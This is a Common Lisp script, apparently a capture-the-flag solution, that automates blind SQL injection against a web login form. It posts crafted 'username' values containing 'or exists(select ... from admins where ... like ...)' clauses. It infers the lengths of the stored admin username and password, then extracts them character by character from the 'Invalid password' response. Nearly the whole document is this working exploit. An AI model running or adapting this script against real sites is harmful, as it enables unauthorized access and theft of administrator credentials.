(ql:quickload :dexador)
(ql:quickload :plump)
(ql:quickload :clss)

(defun post (url params)
  (dex:post url
            :content params))

(defun get-result (html-data)
  (unless html-data
    (return-from get-result nil))
  (let ((tmp (plump:parse html-data)))
    (unless html-data
      (return-from get-result nil))
    (plump:text (aref (clss:select "div" tmp) 0))))


(defvar char-list (list #\_ #\a #\b #\c #\d #\e #\f #\g #\h #\i #\j #\k #\l #\m #\n #\o #\p #\q #\r #\s #\t #\u #\v #\w #\x #\y #\z #\0 #\1 #\2 #\3 #\4 #\5 #\6 #\7 #\8 #\9))

(defun create-string (count-list &optional (result ""))
  (if (or (null count-list) (null (car count-list)))
      result
      (create-string (cdr count-list)
                     (concatenate 'string result
                                  (string (nth (car count-list) char-list))))))

(defun search-string (url column-name count-list &optional (current-pos 0) (final-result nil))
  (when (<= (length count-list) current-pos)
    (return-from search-string (reverse final-result)))
  (incf (nth current-pos count-list))
  (let* ((username (format nil "a' or exists(select ~A from admins where ~A like '"
                           column-name
                           column-name))
         (value (create-string count-list))
         (final-text (format nil "~A~A');" username value)))
    (format t "final text: ~A~%" final-text)
    (let ((result (get-result (post url
                                    (list (cons "username" final-text)
                                          (cons "password" ""))))))
      (if (equal result "Invalid password")
          (progn
            (push (nth (nth current-pos count-list) char-list) final-result)
            (search-string url column-name count-list (1+ current-pos) final-result))
          (search-string url column-name count-list current-pos final-result)))))


(defun detect-length (url column-name table-name)
  (let ((query-base (format nil "a' or exists(select ~A from ~A where ~A like '" column-name table-name column-name)))
    (labels ((try-detect (base &optional (count 1))
               (when (> count 32)
                 (return-from try-detect nil))
               (let ((text (coerce (loop for i from 0 to count
                                         collect #\_)
                                   'string)))
                 (let ((post-result (get-result (post url
                                                      (list
                                                       (cons "username" (format nil "~A~A');" base text))
                                                       (cons "password" ""))))))
                   (if (equal post-result "Invalid password")
                       count
                       (try-detect base (1+ count)))))))
      (try-detect query-base))))

(defun main (url &rest argv)
  (declare (ignore argv))
  (let ((password-size (detect-length url "password" "admins"))
        (username-size (detect-length url "username" "admins")))
    (let ((username (search-string url
                                   "username"
                                   (loop for i from 0 to username-size
                                         collect 0)
                                   )))
      (if (null username)
          (format t "failed search username")
          (print (search-string url
                                "password"
                                (loop for i from 0 to password-size
                                      collect 0)))))))

